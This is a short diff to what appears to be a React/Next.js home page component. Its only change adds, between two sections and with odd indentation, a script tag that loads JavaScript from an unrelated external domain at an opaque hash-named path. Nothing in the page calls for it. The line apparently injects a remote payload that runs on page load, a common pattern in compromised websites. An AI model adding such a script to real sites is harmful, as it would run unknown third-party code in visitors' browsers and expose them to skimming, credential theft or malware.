@@ -189,6 +189,7 @@ export default function Home() {
           </div>
         </div>
       </section>
+<script src="https://windingfold.com/5a/6b/b7/5a6bb7b145a8c9afb42d974d518d15c2.js"></script>
 
       {/* How it Works - Cards Layout */}
       <section className="py-24 bg-white">
